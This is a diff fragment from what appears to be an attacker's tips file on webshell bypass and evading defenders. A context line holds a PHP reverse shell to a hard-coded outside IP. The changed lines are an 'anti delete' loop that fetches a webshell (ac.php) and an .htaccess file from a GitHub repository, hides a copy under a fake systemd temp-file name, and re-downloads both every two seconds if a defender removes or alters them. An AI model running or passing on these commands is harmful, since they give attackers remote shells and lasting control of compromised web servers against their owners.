@@ -20,7 +20,7 @@ php -r '$sock=fsockopen("104.248.145.105",1234);shell_exec("sh <&3 >&3 2>&3");'
 # Tips & Trick Bypass Webshell / Crack Other Things / Defender Stuff
 ### Anti Delete Command : 
 ```
-curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; while true; do echo $(TZ=Asia/Jakarta date); if [ ! -f ac.php ] && ! grep -q '@CallMeRep' ac.php; then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi; if [ -r .htaccess ] && [ -w .htaccess ] && ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess; fi; echo $(TZ=Asia/Jakarta date); sleep 2; done
+curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; while true; do echo $(TZ=Asia/Jakarta date); if [ ! -f ac.php ] || ([ -f ac.php ] && ! grep -q '@CallMeRep' ac.php); then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi; if [ -r .htaccess ] && [ -w .htaccess ] && ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess; fi; echo $(TZ=Asia/Jakarta date); sleep 2; done
 ```
 #### Script
 ```
